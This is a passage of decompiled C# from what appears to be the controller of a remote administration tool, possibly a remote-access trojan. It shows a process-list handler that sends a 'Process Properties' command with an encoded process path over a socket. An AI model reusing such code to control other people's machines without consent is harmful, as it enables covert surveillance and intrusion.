					ListViewItem val = (ListViewItem)enumerator.Current;
					if (Processlists.get_SelectedItems().get_Count() > 0)
					{
						MyProject.Forms.FrmMAINGR.s.Send(sock, "Process Properties" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(3).get_Text()) + MyProject.Forms.FrmMAINGR.Key + val.get_SubItems().get_Item(1).get_Text());
						((ToolStripItem)ToolStripStatusLabel1).set_Text("Please wait a moment ...");
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Processlists_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void SystemM_Load(object sender, EventArgs e)
	{
	}
}
